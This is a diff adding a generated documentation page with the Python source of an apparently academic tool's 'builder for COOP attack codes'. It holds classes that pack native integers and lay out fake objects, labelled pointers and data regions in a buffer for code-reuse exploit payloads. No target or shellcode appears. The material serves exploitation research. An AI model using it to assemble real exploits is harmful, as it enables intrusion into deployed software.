@@ -1,0 +1,899 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>autocoop.builder.builder &#8212; Auto-COOP  documentation</title>
+    <link rel="stylesheet" href="../../../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <script type="text/javascript" id="documentation_options" data-url_root="../../../" src="../../../_static/documentation_options.js"></script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+   
+  <link rel="stylesheet" href="../../../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          
+
+          <div class="body" role="main">
+            
+  <h1>Source code for autocoop.builder.builder</h1><div class="highlight"><pre>
+<span></span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">Builder for COOP attack codes.</span>
+<span class="sd">Author: flxflx / felix.schuster@rub.de</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<div class="viewcode-block" id="Relocator"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Relocator">[docs]</a><span class="k">class</span> <span class="nc">Relocator</span><span class="p">:</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base0</span><span class="p">,</span> <span class="n">base1</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">base0</span> <span class="o">=</span> <span class="n">base0</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">base1</span> <span class="o">=</span> <span class="n">base1</span>
+
+<div class="viewcode-block" id="Relocator.ptr"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Relocator.ptr">[docs]</a>    <span class="k">def</span> <span class="nf">ptr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ptr</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">ptr</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">base0</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">base1</span></div></div>
+
+<div class="viewcode-block" id="Arch"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Arch">[docs]</a><span class="k">class</span> <span class="nc">Arch</span><span class="p">:</span>
+
+<div class="viewcode-block" id="Arch.X64"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Arch.X64">[docs]</a>    <span class="k">class</span> <span class="nc">X64</span><span class="p">:</span>
+    
+        <span class="n">sizeNativeInt</span> <span class="o">=</span> <span class="mi">8</span>
+<div class="viewcode-block" id="Arch.X64.packNativeInt"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Arch.X64.packNativeInt">[docs]</a>        <span class="nd">@staticmethod</span>
+        <span class="k">def</span> <span class="nf">packNativeInt</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+            <span class="nb">format</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;&lt;q&quot;</span> <span class="ow">or</span> <span class="s2">&quot;&lt;Q&quot;</span>
+            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">format</span><span class="p">,</span><span class="n">i</span><span class="p">)</span></div></div>
+
+<div class="viewcode-block" id="Arch.X86"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Arch.X86">[docs]</a>    <span class="k">class</span> <span class="nc">X86</span><span class="p">:</span>
+        
+        <span class="n">sizeNativeInt</span> <span class="o">=</span> <span class="mi">4</span>
+<div class="viewcode-block" id="Arch.X86.packNativeInt"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Arch.X86.packNativeInt">[docs]</a>        <span class="nd">@staticmethod</span>
+        <span class="k">def</span> <span class="nf">packNativeInt</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+            <span class="nb">format</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;&lt;l&quot;</span> <span class="ow">or</span> <span class="s2">&quot;&lt;L&quot;</span>
+            <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">format</span><span class="p">,</span><span class="n">i</span><span class="p">)</span></div></div></div>
+
+<div class="viewcode-block" id="Memory"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory">[docs]</a><span class="k">class</span> <span class="nc">Memory</span><span class="p">:</span>
+    
+<div class="viewcode-block" id="Memory.Region"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.Region">[docs]</a>    <span class="k">class</span> <span class="nc">Region</span><span class="p">:</span>
+        <span class="k">def</span> <span class="nf">__len__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">size</span>
+    
+        <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+            <span class="sd">&quot;&quot;&quot; Constructor.</span>
+<span class="sd">            @param offset The offset of the memory region.</span>
+<span class="sd">            @param data [OPTIONAL] Initial data of the region. </span>
+<span class="sd">            @param size [OPTIONAL] The size of the region. Must not be None if &#39;data&#39; is already None.</span>
+<span class="sd">            @param label [OPTIONAL] The label of the region.</span>
+<span class="sd">            &quot;&quot;&quot;</span>
+            <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+                <span class="k">assert</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+            <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">label</span> <span class="o">=</span> <span class="n">label</span>
+        
+<div class="viewcode-block" id="Memory.Region.conflicts"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.Region.conflicts">[docs]</a>        <span class="k">def</span> <span class="nf">conflicts</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">offset</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">size</span><span class="p">)</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">offset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Memory.Region.setData"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.Region.setData">[docs]</a>        <span class="k">def</span> <span class="nf">setData</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+            <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">size</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span></div></div>
+
+<div class="viewcode-block" id="Memory.Pointer"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.Pointer">[docs]</a>    <span class="k">class</span> <span class="nc">Pointer</span><span class="p">(</span><span class="n">Region</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Placeholder for a pointer to a certain label. &quot;&quot;&quot;</span>
+
+        <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">targetLabel</span><span class="p">,</span> <span class="n">targetOffset</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+            <span class="sd">&quot;&quot;&quot; Constructor.</span>
+<span class="sd">            @param offset The offset of the pointer.</span>
+<span class="sd">            @param size The size of the pointer.</span>
+<span class="sd">            @param targetLabel The label to point to.</span>
+<span class="sd">            @param targetOffset [OPTIONAL] Offset to the label.</span>
+<span class="sd">            &quot;&quot;&quot;</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">targetLabel</span> <span class="o">=</span> <span class="n">targetLabel</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">targetOffset</span> <span class="o">=</span> <span class="n">targetOffset</span>
+            <span class="n">Memory</span><span class="o">.</span><span class="n">Region</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="n">size</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">label</span><span class="p">)</span></div>
+
+    <span class="n">FILL_CHAR</span> <span class="o">=</span> <span class="s1">&#39;$&#39;</span>
+            
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="n">Arch</span><span class="o">.</span><span class="n">X64</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">regions</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">arch</span>
+            
+<div class="viewcode-block" id="Memory.addRegion"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addRegion">[docs]</a>    <span class="k">def</span> <span class="nf">addRegion</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">region</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">isRangeFree</span><span class="p">(</span><span class="n">region</span><span class="o">.</span><span class="n">offset</span><span class="p">,</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span><span class="p">):</span> <span class="k">return</span> <span class="kc">False</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="n">region</span><span class="o">.</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="n">region</span>
+        <span class="k">return</span> <span class="kc">True</span></div>
+        
+<div class="viewcode-block" id="Memory.isRangeFree"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.isRangeFree">[docs]</a>    <span class="k">def</span> <span class="nf">isRangeFree</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+        <span class="c1"># TODO: this is not optimal but works</span>
+        <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
+            <span class="k">if</span> <span class="n">region</span><span class="o">.</span><span class="n">conflicts</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span> <span class="k">return</span> <span class="kc">False</span>
+            
+        <span class="k">return</span> <span class="kc">True</span></div>
+        
+<div class="viewcode-block" id="Memory.findOffsetForRegion"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.findOffsetForRegion">[docs]</a>    <span class="k">def</span> <span class="nf">findOffsetForRegion</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+        <span class="n">offsets</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="n">offsets</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+        
+        <span class="n">offsetFreeRange</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="n">offsets</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">offset</span> <span class="o">-</span> <span class="n">offsetFreeRange</span> <span class="o">&gt;=</span> <span class="n">size</span><span class="p">:</span> <span class="k">break</span>
+            <span class="n">region</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
+            <span class="n">offsetFreeRange</span> <span class="o">=</span> <span class="n">region</span><span class="o">.</span><span class="n">offset</span> <span class="o">+</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span>
+        
+        <span class="k">return</span> <span class="n">offsetFreeRange</span></div>
+        
+<div class="viewcode-block" id="Memory.getBuffer"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.getBuffer">[docs]</a>    <span class="k">def</span> <span class="nf">getBuffer</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">offsets</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="n">offsets</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+        
+        <span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="n">nextOffset</span> <span class="o">=</span> <span class="mi">0</span>
+        
+        <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="n">offsets</span><span class="p">:</span>
+            <span class="n">region</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
+            <span class="n">buffer</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">FILL_CHAR</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="n">nextOffset</span><span class="p">)</span>
+            <span class="n">buffer</span> <span class="o">+=</span> <span class="n">region</span><span class="o">.</span><span class="n">data</span>
+            <span class="n">nextOffset</span> <span class="o">=</span> <span class="n">region</span><span class="o">.</span><span class="n">offset</span> <span class="o">+</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span>
+            
+        <span class="k">return</span> <span class="n">buffer</span></div>
+
+<div class="viewcode-block" id="Memory.addLabel"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addLabel">[docs]</a>    <span class="k">def</span> <span class="nf">addLabel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">label</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds a label at a certain offset. </span>
+<span class="sd">        @param offset The offset of the region to label.</span>
+<span class="sd">        @param size The size of the region to label.</span>
+<span class="sd">        @param The identifier of the label (typically an integer).</span>
+<span class="sd">        @returns True on success.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addRegion</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">Region</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="n">size</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">label</span><span class="p">))</span></div>
+
+<div class="viewcode-block" id="Memory.addUnresolvedPointer"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addUnresolvedPointer">[docs]</a>    <span class="k">def</span> <span class="nf">addUnresolvedPointer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">targetLabel</span><span class="p">,</span> <span class="n">targetOffset</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds a placeholder for a pointer to a certain label. </span>
+<span class="sd">        Example:</span>
+<span class="sd">        if your gadget has the following semantics: &quot;dword ptr [dword ptr [ecx+10h]+28h] =&gt; 5&quot;</span>
+<span class="sd">        then chossing offset=0x10, targetOffset=-0x28 and label=XYZ would write the value 5 to the address labeld XYZ.</span>
+
+<span class="sd">        @param offset Offset from the beginning of the object in bytes.</span>
+<span class="sd">        @param targetLabel The label the yet to-be-resolved pointer should point to.</span>
+<span class="sd">        @paran targetOffset [optional] The offset from the target label the yet to-be-resolved pointer should point to.</span>
+<span class="sd">        @param label [optional] A unique global label for this pointer.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addRegion</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span><span class="p">,</span> <span class="n">targetLabel</span><span class="p">,</span> <span class="n">targetOffset</span><span class="p">,</span> <span class="n">label</span><span class="p">))</span></div>
+
+<div class="viewcode-block" id="Memory.addData"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addData">[docs]</a>    <span class="k">def</span> <span class="nf">addData</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds a data region to the object (convenience method). </span>
+<span class="sd">        @param offset Offset from the beginning of the object in bytes.</span>
+<span class="sd">        @param data The data to add.</span>
+<span class="sd">        @param label A unique global label for the data.</span>
+<span class="sd">        @returns True on success.</span>
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addRegion</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">Region</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">label</span><span class="p">))</span></div>
+
+<div class="viewcode-block" id="Memory.addPointer"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addPointer">[docs]</a>    <span class="k">def</span> <span class="nf">addPointer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Adds an absolute pointer. &quot;&quot;&quot;</span>
+        <span class="k">assert</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">8</span><span class="p">]</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">sizeNativeInt</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addDword</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">label</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">label</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Memory.addQword"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addQword">[docs]</a>    <span class="k">def</span> <span class="nf">addQword</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">qword</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">assert</span> <span class="n">label</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">label</span><span class="p">)</span>
+
+        <span class="nb">format</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;&lt;q&quot;</span> <span class="ow">or</span> <span class="s2">&quot;&lt;Q&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">format</span><span class="p">,</span><span class="n">qword</span><span class="p">),</span> <span class="n">label</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Memory.addDword"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addDword">[docs]</a>    <span class="k">def</span> <span class="nf">addDword</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">dword</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">dword</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">assert</span> <span class="n">label</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">label</span><span class="p">)</span>
+
+        <span class="nb">format</span> <span class="o">=</span> <span class="p">(</span><span class="n">dword</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;&lt;l&quot;</span> <span class="ow">or</span> <span class="s2">&quot;&lt;L&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">format</span><span class="p">,</span><span class="n">dword</span><span class="p">),</span> <span class="n">label</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Memory.addWord"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addWord">[docs]</a>    <span class="k">def</span> <span class="nf">addWord</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">word</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">word</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">assert</span> <span class="n">label</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">label</span><span class="p">)</span>
+
+        <span class="nb">format</span> <span class="o">=</span> <span class="p">(</span><span class="n">word</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;&lt;h&quot;</span> <span class="ow">or</span> <span class="s2">&quot;&lt;H&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">format</span><span class="p">,</span><span class="n">word</span><span class="p">),</span> <span class="n">label</span><span class="p">)</span></div>
+
+<div class="viewcode-block" id="Memory.addByte"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.addByte">[docs]</a>    <span class="k">def</span> <span class="nf">addByte</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">byte</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">byte</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">assert</span> <span class="n">label</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">label</span><span class="p">)</span>
+
+        <span class="nb">format</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;&lt;b&quot;</span> <span class="ow">or</span> <span class="s2">&quot;&lt;B&quot;</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">format</span><span class="p">,</span><span class="n">byte</span><span class="p">),</span> <span class="n">label</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="Memory.invalidate"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.invalidate">[docs]</a>    <span class="k">def</span> <span class="nf">invalidate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">Memory</span><span class="o">.</span><span class="n">Region</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="n">size</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">addRegion</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">True</span></div>
+
+<div class="viewcode-block" id="Memory.getSize"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.getSize">[docs]</a>    <span class="k">def</span> <span class="nf">getSize</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="mi">0</span>
+        <span class="n">offsets</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="n">offsets</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+        <span class="n">lastRegion</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">regions</span><span class="p">[</span><span class="n">offsets</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
+        <span class="k">return</span> <span class="n">lastRegion</span><span class="o">.</span><span class="n">offset</span> <span class="o">+</span> <span class="n">lastRegion</span><span class="o">.</span><span class="n">size</span></div>
+
+<div class="viewcode-block" id="Memory.getMaxOffset"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.builder.Memory.getMaxOffset">[docs]</a>    <span class="k">def</span> <span class="nf">getMaxOffset</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">getSize</span><span class="p">()</span>
+        <span class="k">assert</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span>
+        <span class="k">return</span> <span class="n">size</span><span class="o">-</span><span class="mi">1</span></div>
+
